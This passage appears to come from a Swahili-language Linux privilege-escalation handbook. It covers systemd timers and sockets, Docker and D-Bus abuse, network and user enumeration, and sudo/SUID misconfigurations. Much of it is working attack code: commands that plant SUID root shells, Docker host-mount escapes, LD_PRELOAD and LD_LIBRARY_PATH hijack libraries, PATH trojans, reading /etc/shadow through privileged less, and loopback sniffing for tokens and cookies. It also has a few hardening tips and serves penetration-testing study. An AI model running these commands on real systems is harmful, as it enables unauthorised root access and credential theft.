Katika nyaraka unaweza kusoma nini Unit ni:

> Kitengo kinachowashwa wakati timer hii itaisha. Hoja ni jina la unit, ambalo kiambishi chake si ".timer". Ikiwa haijaainishwa, thamani hii huwekwa kwa default kwa service ambayo ina jina lile lile kama timer unit, isipokuwa kiambishi. (See above.) Inashauriwa kwamba jina la unit linalowashwa na jina la unit la timer liwe sawa kabisa, isipokuwa kiambishi.

Kwa hiyo, ili kutumia vibaya ruhusa hii utahitaji:

- Tafuta systemd unit fulani (kama a `.service`) ambayo inafanya **executing a writable binary**
- Tafuta systemd unit nyingine ambayo inafanya **executing a relative path** na una **writable privileges** juu ya **systemd PATH** (to impersonate that executable)

**Jifunze zaidi kuhusu timers kwa `man systemd.timer`.**

### **Kuwezesha Timer**

Ili kuwezesha timer unahitaji root privileges na kuendesha:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Kumbuka **timer** **imeamilishwa** kwa kuunda symlink kwake kwenye `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) zinawezesha **mawasiliano ya mchakato** kwenye mashine sawa au tofauti ndani ya client-server models. Zinatumia faili za descriptor za Unix za mawasiliano kati ya kompyuta na zinaanzishwa kupitia faili za `.socket`.

Sockets zinaweza kusanidiwa kwa kutumia faili za `.socket`.

**Jifunze zaidi kuhusu sockets kupitia `man systemd.socket`.** Ndani ya faili hii, vigezo kadha vinavutia vinaweza kusanidiwa:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Chaguzi hizi ni tofauti lakini muhtasari hutumiwa **kuonyesha mahali itakaposikiliza** socket (njia ya faili ya AF_UNIX socket, IPv4/6 na/au nambari ya port ya kusikiliza, n.k.)
- `Accept`: Inapokea hoja ya boolean. Ikiwa **true**, **service instance itatengenezwa kwa kila muunganisho unaokuja** na socket ya muunganisho pekee ndilo linalopitishwa kwake. Ikiwa **false**, sockets zote za kusikiliza zinapita kwa **unit ya service iliyozinduliwa**, na unit moja ya service tu itatengenezwa kwa muunganisho wote. Thamani hii haisisitwi kwa datagram sockets na FIFOs ambapo unit moja ya service inashughulikia bila masharti semua trafiki zote zinazokuja. **Kwa chaguo-msingi ni false**. Kwa sababu za utendaji, inapendekezwa kuandika daemons mpya kwa njia inayofaa `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Zinapokea mstari mmoja au zaidi wa amri, ambazo **hutekelezwa kabla** au **baada** socket/FIFO za kusikiliza zinapoundwa na kufungwa, mtawaliwa. Tokeni ya kwanza ya mstari wa amri lazima iwe jina la faili lenye njia kamili, kisha ifuatwe na hoja za mchakato.
- `ExecStopPre`, `ExecStopPost`: Amri za ziada zinazotekelezwa **kabla** au **baada** socket/FIFO za kusikiliza zifungwa na kuondolewa, mtawaliwa.
- `Service`: Inaeleza jina la unit ya **service** **ya kuanzishwa** kwa **trafiki inayoingiza**. Mpangilio huu unaruhusiwa tu kwa sockets zenye Accept=no. Kwa chaguo-msingi inarejelea service yenye jina sawa na socket (kwa kubadilisha kiambishi). Katika zaidi ya matukio, haitakuwa lazima kutumia chaguo hili.

### Writable .socket files

Kama utapata faili ya `.socket` inayoweza kuandikwa (**writable**) unaweza **kuongeza** mwanzoni mwa sehemu ya `[Socket]` kitu kama: `ExecStartPre=/home/kali/sys/backdoor` na backdoor itatekelezwa kabla ya socket kuundwa. Kwa hivyo, **huenda utahitaji kusubiri mpaka mashine ianze upya.**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Socket activation + writable unit path (create missing service)

Upungufu mwingine wenye athari kubwa ni:

- unit ya socket yenye `Accept=no` na `Service=<name>.service`
- unit ya service iliyorejelewa haipo
- mshambuliaji anaweza kuandika ndani ya `/etc/systemd/system` (au njia nyingine ya kutafuta unit)

Katika hali hiyo, mshambuliaji anaweza kuunda `<name>.service`, kisha kuchochea trafiki kwa socket ili systemd ipakue na itekeleze service mpya kama root.

Mtiririko mfupi:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Sockets zinazoweza kuandikwa

Ikiwa utatambua **socket yoyote inayoweza kuandikwa** (_sasa tunazungumzia Unix Sockets na si kuhusu faili za config `.socket`_), basi **unaweza kuwasiliana** na socket hiyo na labda kutumia exploit kufaida udhaifu.

### Orodhesha Unix Sockets
```bash
netstat -a -p --unix
```
### Muunganisho wa ghafi
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Kumbuka kwamba kunaweza kuwa baadhi ya **sockets listening for HTTP** ambazo zinapokea maombi (_Sielezei kuhusu .socket files, bali kuhusu faili zinazofanya kazi kama unix sockets_). Unaweza kuangalia hili kwa:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
Ikiwa socket **responds with an HTTP** request, basi unaweza **kuwasiliana** nayo na labda **exploit some vulnerability**.

### Docker Socket Inayoweza Kuandikwa

Socket ya Docker, mara nyingi inapatikana katika `/var/run/docker.sock`, ni faili muhimu ambayo inapaswa kulindwa. Kwa chaguo-msingi, inaweza kuandikwa na mtumiaji wa `root` na wanachama wa kikundi cha `docker`. Kuwa na write access kwenye socket hii kunaweza kusababisha privilege escalation. Hapa kuna muhtasari wa jinsi hii inaweza kufanywa na mbinu mbadala ikiwa Docker CLI haipatikani.

#### **Privilege Escalation with Docker CLI**

Ikiwa una write access kwenye Docker socket, unaweza escalate privileges kwa kutumia amri zifuatazo:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
These commands allow you to run a container with root-level access to the host's file system.

#### **Using Docker API Directly**

In cases where the Docker CLI isn't available, the Docker socket can still be manipulated using the Docker API and `curl` commands.

1.  **List Docker Images:** Retrieve the list of available images.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Send a request to create a container that mounts the host system's root directory.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Use `socat` to establish a connection to the container, enabling command execution within it.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

After setting up the `socat` connection, you can execute commands directly in the container with root-level access to the host's filesystem.

### Others

Kumbuka kwamba ikiwa una write permissions juu ya docker socket kwa sababu uko **inside the group `docker`** una [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). If the [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Angalia njia zaidi za kutoroka kutoka kwa containers au kutumia vibaya container runtimes ili kupata privileges katika:


{{#ref}}
container-security/
{{#endref}}

## Containerd (ctr) privilege escalation

If you find that you can use the **`ctr`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

If you find that you can use the **`runc`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus ni mfumo wa kisasa wa inter-Process Communication (IPC) unaowawezesha applications kuwasiliana kwa ufanisi na kushiriki data. Imetengenezwa kwa ajili ya mfumo wa kisasa wa Linux, inatoa mfumo imara kwa aina mbalimbali za mawasiliano ya application.

Mfumo ni wenye uwezo mwingi, ukiunga mkono IPC ya msingi inayoboreshwa kubadilishana data kati ya processes, ikikumbusha enhanced UNIX domain sockets. Zaidi ya hayo, husaidia kutangaza matukio au signals, ikichochea muunganisho usio na mshono kati ya vipengele vya mfumo. Kwa mfano, signal kutoka kwa Bluetooth daemon kuhusu simu inayoingia inaweza kuamsha player ya muziki kufunga sauti, kuboresha uzoefu wa mtumiaji. Zaidi ya hayo, D-Bus inaunga mkono mfumo wa remote object, ukifanya maombi ya huduma na invocation za method kati ya applications kuwa rahisi, na kurahisisha michakato ambayo hapo awali ilikuwa ngumu.

D-Bus inaendesha kwa modeli ya **allow/deny**, ikisimamia ruhusa za ujumbe (method calls, signal emissions, n.k.) kulingana na athari ya jumla ya sheria za sera zinazolingana. Sera hizi zinaeleza mwingiliano na bus, zikiweza kuruhusu privilege escalation kupitia matumizi mabaya ya ruhusa hizi.

Mfano wa sera kama hiyo katika `/etc/dbus-1/system.d/wpa_supplicant.conf` umeonyeshwa, ukielezea ruhusa kwa user root kumiliki, kutuma, na kupokea ujumbe kutoka `fi.w1.wpa_supplicant1`.

Sera zisizo na user au group iliyotajwa zinatumika kwa wote, wakati sera za muktadha "default" zinatumika kwa wote wasiokuwa wameshikiliwa na sera maalum nyingine.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Jifunze jinsi ya enumerate na exploit D-Bus communication hapa:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Mtandao**

Inavutia kila wakati ku-enumerate mtandao na kubaini nafasi ya mashine.

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Tathmini ya haraka ya uchujaji unaotoka

Ikiwa host inaweza kuendesha amri lakini callbacks zinashindwa, tenganisha kwa haraka uchujaji wa DNS, transport, proxy, na route:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Bandari wazi

Daima angalia huduma za mtandao zinazokimbia kwenye mashine ambazo hukuweza kuingiliana nazo kabla ya kuzipata:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
Panga listeners kwa bind target:

- `0.0.0.0` / `[::]`: inapatikana kwenye interfaces zote za ndani.
- `127.0.0.1` / `::1`: ya ndani tu (wanafaa vizuri kwa tunnel/forward).
- Specific internal IPs (e.g. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): kawaida zinapatikana tu kutoka sehemu za ndani.

### Mtiririko wa uchambuzi kwa huduma za ndani tu

Unapofanikiwa kudhibiti host, huduma zilizounganishwa na `127.0.0.1` mara nyingi huanza kupatikana kwa mara ya kwanza kutoka shell yako. Mtiririko wa kazi wa haraka wa ndani ni:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS kama skana ya mtandao (modi ya mtandao pekee)

Mbali na ukaguzi wa PE wa ndani, linPEAS inaweza kuendeshwa kama skana ya mtandao iliyolengwa. Inatumia binaries zilizopo katika `$PATH` (kwa kawaida `fping`, `ping`, `nc`, `ncat`) na haisakinishi tooling.
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
If you pass `-d`, `-p`, or `-i` without `-t`, linPEAS behaves as a pure network scanner (skipping the rest of privilege-escalation checks).

### Sniffing

Angalia ikiwa unaweza sniff traffic. Ikiwa unaweza, unaweza kupata baadhi ya taarifa za kuingia.
```
timeout 1 tcpdump
```
Mikaguzi ya haraka ya vitendo:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) ni muhimu sana katika post-exploitation kwa sababu huduma nyingi za ndani pekee zinafunua tokens/cookies/credentials hapo:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
Chukua sasa, chambua baadaye:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Watumiaji

### Generic Enumeration

Angalia wewe ni **nani**, ni **privileges** gani ulizo nazo, **users** gani wako kwenye mfumo, ni zipi zinaweza **login**, na ni zipi zina **root privileges:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### UID Kubwa

Baadhi ya matoleo ya Linux yaliathiriwa na mdudu unaowawezesha watumiaji wenye **UID > INT_MAX** kupandisha ruhusa. Maelezo zaidi: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** kwa kutumia: **`systemd-run -t /bin/bash`**

### Vikundi

Angalia ikiwa wewe ni **mwanachama wa kundi fulani** ambao unaweza kukupa root privileges:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Ubao la kunakili

Angalia kama kuna kitu chochote cha kuvutia kilicho kwenye ubao la kunakili (ikiwa inawezekana)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Sera ya Nywila
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Nywila zinazojulikana

Ikiwa **unajua nywila yoyote** ya mazingira, **jaribu kuingia kwa kila mtumiaji** ukitumia nywila hiyo.

### Su Brute

Ikiwa huna wasiwasi kuhusu kusababisha kelele nyingi na binaries za `su` na `timeout` ziko kwenye kompyuta, unaweza kujaribu brute-force mtumiaji ukitumia [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) na parameter `-a` pia hujaribu brute-force kwa watumiaji.

## Matumizi mabaya ya PATH inayoweza kuandikwa

### $PATH

Ikiwa utagundua kwamba unaweza **kuandika ndani ya baadhi ya folda za $PATH**, huenda ukaweza kupandisha vibali kwa **kuunda backdoor ndani ya folda inayoweza kuandikwa** kwa jina la amri ambayo itaendeshwa na mtumiaji mwingine (root inafaa) na ambayo **haitapakiwa kutoka kwenye folda iliyopo kabla** ya folda yako inayoweza kuandikwa katika $PATH.

### SUDO and SUID

Unaweza kuruhusiwa kutekeleza amri fulani ukitumia sudo au zinaweza kuwa na suid bit. Angalia kwa kutumia:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Baadhi ya **amri zisizotarajiwa zinakuwezesha kusoma na/au kuandika faili au hata kutekeleza amri.** Kwa mfano:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Usanidi wa sudo unaweza kumruhusu mtumiaji kutekeleza amri fulani kwa haki za mtumiaji mwingine bila kujua nenosiri.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Katika mfano huu mtumiaji `demo` anaweza kuendesha `vim` kama `root`, sasa ni rahisi kupata shell kwa kuongeza ssh key katika saraka ya `root` au kwa kuita `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Agizo hili linamruhusu mtumiaji **kusanidi variable ya mazingira** wakati anatekeleza kitu:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Mfano huu, **based on HTB machine Admirer**, ulikuwa **vulnerable** kwa **PYTHONPATH hijacking** ili kupakia maktaba yoyote ya python wakati script ikitekelezwa kama root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV imehifadhiwa kupitia sudo env_keep → root shell

Ikiwa sudoers inahifadhi `BASH_ENV` (kwa mfano, `Defaults env_keep+="ENV BASH_ENV"`), unaweza kutumia tabia ya kuanzishwa isiyo-interactive ya Bash kukimbiza kodu yoyote kama root unapotumia amri inayoruhusiwa.

- Kwa nini inafanya kazi: Kwa shell zisizo-interactive, Bash hutathmini `$BASH_ENV` na hufanya source faili hiyo kabla ya kuendesha script lengwa. Sheria nyingi za sudo zinaruhusu kuendesha script au wrapper ya shell. Ikiwa `BASH_ENV` imehifadhiwa na sudo, faili yako itasomwa kwa ruhusa za root.

- Mahitaji:
- Sheria ya sudo unayoweza kuendesha (lengo lolote linaloitisha `/bin/bash` bila interactive, au script yoyote ya bash).
- `BASH_ENV` iwepo katika `env_keep` (angalia kwa kutumia `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Kuimarisha:
- Ondoa `BASH_ENV` (na `ENV`) kutoka `env_keep`; tumia `env_reset`.
- Epuka shell wrappers kwa amri zinazoruhusiwa na sudo; tumia binaries ndogo.
- Fikiria kurekodi I/O ya sudo na kutoa tahadhari wakati env vars zilizo hifadhiwa zinapotumika.

### Terraform kupitia sudo na HOME iliyohifadhiwa (!env_reset)

Iwapo sudo inaacha mazingira kama yalivyo (`!env_reset`) huku ikiruhusu `terraform apply`, `$HOME` inabaki kuwa ya mtumiaji anayetoa amri. Kwa hiyo Terraform inapakia **$HOME/.terraformrc** kama root na inaheshimu `provider_installation.dev_overrides`.

- Elekeza provider inayohitajika kwenye directory inayoweza kuandikwa na weka plugin hatari iliyopewa jina la provider (mfano, `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform itashindwa kwenye Go plugin handshake lakini hutekeleza payload kama root kabla ya kuishia, ikiacha SUID shell nyuma.

### TF_VAR overrides + symlink validation bypass

Terraform variables zinaweza kutolewa kupitia environment variables `TF_VAR_<name>`, ambazo zinaendelea kuwepo wakati sudo inahifadhi environment. Validations dhaifu kama `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` zinaweza kuepukwa kwa symlinks:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform inatatua symlink na kunakili `/root/root.txt` halisi ndani ya attacker-readable destination. Njia ile ile inaweza kutumika **kuandika** katika njia zenye ruhusa kwa kuunda mapema destination symlinks (kwa mfano, kuielekeza provider’s destination path ndani ya `/etc/cron.d/`).

### requiretty / !requiretty

Katika baadhi ya matoleo ya zamani, sudo inaweza kusanidiwa na `requiretty`, ambayo inalazimisha sudo kuendeshwa tu kutoka TTY ya kuingiliana. Ikiwa `!requiretty` imewekwa (au chaguo hilo halipo), sudo inaweza kutekelezwa kutoka muktadha usio wa kuingiliana kama reverse shells, cron jobs, au scripts.
```bash
Defaults !requiretty
```
Hii si udhaifu wa moja kwa moja yenyewe, lakini inaongeza hali ambapo sheria za sudo zinaweza kutumiwa vibaya bila kuhitaji PTY kamili.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Ikiwa `sudo -l` inaonyesha `env_keep+=PATH` au `secure_path` ambayo ina entries ambazo attacker anaweza kuandika (kwa mfano, `/home/<user>/bin`), amri yoyote isiyo na njia kamili ndani ya lengo linaruhusiwa na sudo inaweza kupewa kivuli.

- Mahitaji: sheria ya sudo (mara nyingi `NOPASSWD`) inayotekeleza script/binary ambayo inaaita amri bila njia kamili (`free`, `df`, `ps`, n.k.) na kipengee cha PATH kinachoweza kuandikwa ambacho kinatafutwa kwanza.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo execution bypassing paths
**Ruka** kusoma faili nyingine au tumia **symlinks**. Kwa mfano katika faili ya sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Ikiwa **wildcard** imetumika (\*), ni rahisi zaidi:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Hatua za kukabiliana**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary bila path ya command

Ikiwa **ruhusa ya sudo** imetolewa kwa command moja **bila kutaja path**: _hacker10 ALL= (root) less_ unaweza kuiexploit kwa kubadilisha variable ya PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Mbinu hii pia inaweza kutumika ikiwa binary ya **suid** **inatekeleza amri nyingine bila kutaja njia yake (hakikisha kila mara kwa kutumia** _**strings**_ **yaliyomo ndani ya binary ya SUID isiyo ya kawaida)**.

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary yenye njia ya amri

Ikiwa **suid** binary **inatekeleza amri nyingine ikibainisha njia**, basi, unaweza kujaribu **export a function** iliwekwa jina kama amri ambayo faili ya suid inaiita.

Kwa mfano, ikiwa suid binary inaita _**/usr/sbin/service apache2 start**_ unatakiwa kujaribu kuunda function na kui-export:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Kisha, unapoita suid binary, function hii itatekelezwa

### Script inayoweza kuandikwa inayotekelezwa na SUID wrapper

Marekebisho ya kawaida ya custom-app ni root-owned SUID binary wrapper inayotekeleza script, huku script yenyewe ikiwa writable kwa low-priv users.

Mfano wa kawaida:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
Ikiwa `/usr/local/bin/backup.sh` inaweza kuandikwa, unaweza kuongeza amri za payload kisha utekeleze SUID wrapper:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
Mikaguzi ya haraka:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
This attack path is especially common in "maintenance"/"backup" wrappers shipped in `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

Kigezo cha mazingira **LD_PRELOAD** kinatumika kubainisha moja au zaidi ya shared libraries (.so files) ambazo loader huzipakia kabla ya nyingine zote, ikijumuisha maktaba ya kawaida ya C (`libc.so`). Mchakato huu unajulikana kama preloading a library.

Hata hivyo, ili kudumisha usalama wa mfumo na kuzuia kipengele hiki kutumika vibaya, hasa kwa ejecutables za **suid/sgid**, mfumo unatekeleza masharti yafuatayo:

- Loader haizingatii **LD_PRELOAD** kwa executables ambapo real user ID (_ruid_) haifanani na effective user ID (_euid_).
- Kwa executables zenye **suid/sgid**, maktaba pekee zilizoko kwenye njia za kawaida ambazo pia ni **suid/sgid** ndizo zinazoloaded.

Privilege escalation inaweza kutokea ikiwa una uwezo wa kutekeleza amri kwa `sudo` na matokeo ya `sudo -l` yanaonyesha tamko **env_keep+=LD_PRELOAD**. Usanidi huu unaruhusu kigezo cha mazingira **LD_PRELOAD** kudumu na kutambuliwa hata wakati amri zinaendeshwa kwa `sudo`, na hivyo kwa uwezekano kusababisha utekelezaji wa msimbo wowote kwa vibali vilivyoinuliwa.
```
Defaults        env_keep += LD_PRELOAD
```
Hifadhi kama **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Kisha **compile it** kwa kutumia:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Hatimaye, **escalate privileges** kwa kuendesha
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Privesc sawa inaweza kutumiwa vibaya ikiwa mshambuliaji anadhibiti env variable **LD_LIBRARY_PATH** kwa sababu anadhibiti path ambapo libraries zitatafutwa.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Unapokutana na binary yenye ruhusa za **SUID** ambazo zinaonekana zisizo za kawaida, ni desturi nzuri kuthibitisha kama inapakia faili za **.so** ipasavyo. Hii inaweza kuangaliwa kwa kuendesha amri ifuatayo:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
